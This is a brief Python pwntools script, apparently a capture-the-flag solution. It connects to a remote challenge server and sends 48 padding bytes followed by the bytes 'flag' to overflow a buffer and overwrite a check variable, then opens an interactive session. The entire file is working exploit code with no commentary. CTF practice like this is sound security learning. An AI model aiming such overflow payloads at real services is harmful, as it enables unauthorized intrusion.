from pwn import *

r = remote('thekidofarcrania.com',35235)

payload = b'A'* 48
payload += b'\x66\x6c\x61\x67'

r.sendline(payload)
# print(r.recv(4096))

r.interactive()